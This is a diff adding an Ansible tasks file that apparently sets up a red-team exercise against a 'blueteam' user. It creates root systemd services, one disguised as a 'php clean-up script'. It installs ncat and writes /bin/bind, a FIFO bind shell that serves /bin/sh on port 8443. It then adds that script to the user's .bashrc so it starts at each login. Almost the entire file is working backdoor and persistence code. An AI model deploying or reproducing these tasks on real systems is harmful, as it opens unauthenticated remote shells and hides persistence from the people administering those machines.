@@ -1,0 +1,102 @@
+---
+# Malicious services tasks
+
+- name: Install malicious service
+  block:
+    - name: Create evil service obvious
+      ansible.builtin.copy:
+        content: |
+          Description=Evil red team things
+
+          Wants = network.target
+
+          [Service]
+          ExecStart=/bin/user-default
+          Restart=always
+          RestartSec=5s
+
+          [Install]
+          WantedBy=multi-user.target
+        dest: "/etc/systemd/system/{{ evil_service_name }}.service"
+        mode: '0600'
+        owner: root
+        group: root
+      register: evil_service_created
+      changed_when: evil_service_created.changed
+
+    - name: Create evil service less obvious
+      ansible.builtin.copy:
+        content: |
+          Description=php clean-up script
+
+          Wants=network.target
+
+          [Service]
+          ExecStart=/usr/bin/php
+          Restart=always
+          RestartSec=5s
+
+          [Install]
+          Wantedy=multi-user.target
+        dest: "/etc/systemd/system/{{ php_service_name }}.service"
+        mode: '0600'
+        owner: root
+        group: root
+      register: php_service_created
+      changed_when: php_service_created.changed
+
+- name: Set up bindshell in .bashrc
+  block:
+    - name: Install ncat on Debian/Ubuntu
+      ansible.builtin.apt:
+        name: ncat
+        state: present
+        update_cache: yes
+        cache_valid_time: 3600
+      when: ansible_facts['os_family'] == "Debian"
+      register: ncat_debian_installed
+      changed_when: ncat_debian_installed.changed
+
+    - name: Install ncat on Redhat/CentOS/Rocky
+      ansible.builtin.dnf:
+        name: nmap-ncat
+        state: present
+        update_cache: yes
+      when: ansible_facts['os_family'] == "RedHat"
+      register: ncat_redhat_installed
+      changed_when: ncat_redhat_installed.changed
+
+    - name: Check if bindshell script exists
+      ansible.builtin.stat:
+        path: /bin/bind
+      register: bindshell_exists
+      changed_when: false
+
+    - name: Create bindshell script
+      ansible.builtin.copy:
+        content: |
+          #!/bin/bash
+          rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh 2>&1 | ncat -l 0.0.0.0 8443 > /tmp/f
+        dest: "/bin/bind"
+        mode: "0755"
+        owner: "root"
+        group: "root"
+      when: not bindshell_exists.stat.exists
+      register: bindshell_created
+      changed_when: bindshell_created.changed
+
+    - name: Check if bindshell is in bashrc
+      ansible.builtin.command: grep -q "/bin/bind" /home/blueteam/.bashrc
+      register: bindshell_in_bashrc
+      changed_when: false
+      failed_when: false
+      check_mode: false
+
+    - name: Add bindshell to .bashrc
+      ansible.builtin.lineinfile:
+        path: /home/blueteam/.bashrc
+        line: "/bin/bind &"
+        state: present
+      when: bindshell_in_bashrc.rc != 0
+      register: bashrc_updated
+      changed_when: bashrc_updated.changed
